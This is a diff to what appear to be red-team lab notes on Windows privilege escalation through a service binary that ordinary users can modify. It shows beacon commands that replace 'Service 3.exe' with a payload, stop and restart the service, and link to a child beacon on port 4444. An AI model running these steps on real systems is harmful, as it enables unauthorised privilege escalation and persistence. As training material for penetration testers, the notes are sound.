@@ -52,6 +52,9 @@ run sc config VulnService2 binPath= \""C:\Program Files\Vulnerable Services\Serv
 
 ## Weak Service Binary Permissions
 
+If we can modify the binary we can replaceit with something else
+
+
 ```
 powershell Get-Acl -Path "C:\Program Files\Vulnerable Services\Service 3.exe" | fl
 
@@ -69,4 +72,34 @@ Sddl   : O:BAG:DUD:AI(A;;0x1301bf;;;BU)(A;ID;FA;;;SY)(A;ID;FA;;;BA)(A;ID;0x1200a
          a9;;;S-1-15-2-2)
 ```
 
- BUILTIN\Users:  Allow  Modify, Synchronize
+ **BUILTIN\Users:  Allow  Modify, Synchronize**
+
+> [!important] 
+> Make a backup first  
+
+```
+download Service 3.exe
+```
+
+Make a copy of your payload whilst renaming it to Service 3.exe.
+```
+PS C:\Payloads>copy "tcp-local_x64.svc.exe" "Service 3.exe"
+beacon> upload C:\Payloads\Service 3.exe
+could not upload file: 32 - ERROR_SHARING_VIOLATION
+```
+
+> [!info] 
+> This seems like an ambiguous error, but it means the file is already in use.  This makes sense, since the service is running.
+>  ```
+>  C:\>net helpmsg 32
+The process cannot access the file because it is being used by another process.
+
+```
+beacon> run sc stop VulnService3
+beacon> upload C:\Payloads\Service 3.exe
+
+beacon> run sc start VulnService3
+beacon> connect localhost 4444
+[+] established link to child beacon: 10.10.123.102
+```
+
